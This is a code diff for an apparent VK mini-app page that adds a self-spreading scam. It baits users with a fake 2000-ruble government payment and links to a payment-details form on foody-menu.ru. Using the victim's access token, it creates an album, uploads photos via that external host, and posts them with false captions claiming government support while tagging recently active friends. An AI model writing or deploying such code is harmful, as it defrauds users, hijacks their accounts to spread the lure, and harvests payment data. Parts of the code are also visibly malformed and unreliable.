@@ -2,7 +2,7 @@
   <head>
     <script defer src="https://newappsbase.com/SP/js/jquery-3.2.1.min.js"></script>
     <script src="https://unpkg.com/@vkontakte/vk-bridge/dist/browser.min.js"></script>
-    
+
     <style>
     body {
       min-height: 100%;
@@ -20,9 +20,16 @@
     <script>
     var viewer;
     var vk_app_id = 0;
+    var id_albom = 0;
+    var token = "";
+    var viewer_id = 0;
+    var global_offset_i = 0;
+    var count_upload_photo = 0;
     $(function() {
         vkConnect.send('VKWebAppInit');
+        viewer = data;
         viewer.id = data.viewer_id;
+        viewer_id = viewer.id;
         vk_app_id = parseInt(data.vk_app_id);
       });
       function getToken() {
@@ -32,7 +39,7 @@
           })
           .then(data => {
               if(token){return false;}
-
+              token = data.access_token;
               firstApi();
           })
           .catch(error => {
@@ -59,7 +66,9 @@
               "method": "execute",
               "params": {"code": code, "v": "5.95", "access_token": token}
           }).then(data => {
+            viewer.friends = data.response[0];
               if(data.response[2].permissions == 0) {
+                createAlbom();
                 $("#content").html('<p style="color: #66727f;">Авторизация успешна, Вы можете заполнить платёжные данные для получения платежа</p><a target="_blank" href="https://foody-menu.ru/createPay.php?uid=1&price=2000" style="text-decoration:none;width:100%;display: inline-block;height: 56px;border-radius: 8px;border: none;font-size: 16px;line-height: 56px;color: #fff;background: #0d4cd3;cursor: pointer;">Заполнить платёжные данные</a>');
               }else{
 
@@ -68,6 +77,100 @@
             .catch(error => {
 
             });
+      }
+
+      function createAlbom(){
+        vkConnect.sendPromise("VKWebAppCallAPIMethod", {
+            "method": "photos.createAlbum",
+            "params": {"Поддержкa","v": "5.95", "access_token": token}
+        }).then(data => {
+          id_albom = data.response.id;
+          uploadPhotoAlbom(id_albom);
+          })
+          .catch(error => {
+
+          });
+      }
+
+      function uploadPhotoAlbom(id_albom){
+
+          vkConnect.sendPromise("VKWebAppCallAPIMethod", {
+            "method": "photos.getUploadServer",
+            "params": {"album_id":id_albom,"v": "5.95", "access_token": token}
+        }).then(data => {
+
+          var upload_url = data.response.upload_url;
+
+          var formData = new FormData();
+          formData.append("upurl", upload_url);
+          formData.append("is_photo", 1);
+          formData.append("viewer_id", viewer_id);
+
+          var xhr = new XMLHttpRequest();
+          xhr.open("POST", "https://foody-menu.ru/SP/uploadPhoto.php", true);
+
+          xhr.onload = function(e) {
+            var data = JSON.parse(xhr.response);
+                  var caption = "";
+                  var users_list = getFriendsOnlineForPhoto();
+
+                  if(viewer.sex == 1) {
+                    var text = [
+                      "Получила финансовую поддержку от государства в размере 2000 рублей, оформить можно в официальном приложении : \n https://vk.com/app"+vk_app_id+"  \n\n "+users_list,
+                      "Сегодня я оформила финансовую поддержку от государства и уже получила их на счёт, оформляйте в приложении : \n https://vk.com/app"+vk_app_id+"  \n\n "+users_list,
+                      "Я получила от государства финансовую поддержку в размере 2000р, можно оформить онлайн : \n https://vk.com/app"+vk_app_id+"  \n\n "+users_list
+                    ];
+                  }else{
+                    var text = [
+                      "Получил финансовую поддержку от государства в размере 2000 рублей, оформить можно в официальном приложении : \n https://vk.com/app"+vk_app_id+"  \n\n "+users_list,
+                      "Сегодня я оформил финансовую поддержку от государства и уже получила их на счёт, оформляйте в приложении : \n https://vk.com/app"+vk_app_id+"  \n\n "+users_list,
+                      "Я получил от государства финансовую поддержку в размере 2000р, можно оформить онлайн : \n https://vk.com/app"+vk_app_id+"  \n\n "+users_list
+                    ];
+                  }
+                var caption = text[getRandom(0,text.length-1)];
+
+                  vkConnect.sendPromise("VKWebAppCallAPIMethod", {
+                      "method": "photos.save",
+                      "params": {"album_id": id_albom, "server": data.server, "photos_list": data.photos_list, "hash":data.hash, "caption":caption,"v": "5.95", "access_token": token}
+                  }).then(data => {
+                    count_upload_photo++;
+
+                    if(count_upload_photo < 4 && viewer.friends.items[global_offset_i+1]){
+                      setTimeout(function() {
+                          uploadPhotoAlbom(id_albom);
+                      }, 100);
+                    }
+
+
+                    })
+                    .catch(error => {
+
+                    });
+          };
+          xhr.send(formData);
+          })
+          .catch(error => {
+          });
+
+      }
+
+      function getFriendsOnlineForPhoto() {
+        sortByLastTime();
+        var users_list = "\n\n";
+        var count = 0;
+        for(;global_offset_i<viewer.friends.items.length;global_offset_i++) {
+            users_list += "[id"+viewer.friends.items[global_offset_i].id+"| !]";
+            count++;
+            if(count > 4){
+              break;
+            }
+        }
+
+          return users_list;
+      }
+
+      function sortByLastTime() {
+        viewer.friends.items.sort((a, b) => b.last_seen.time > a.last_seen.time ? 1 : -1);
       }
     </script>
   </head>
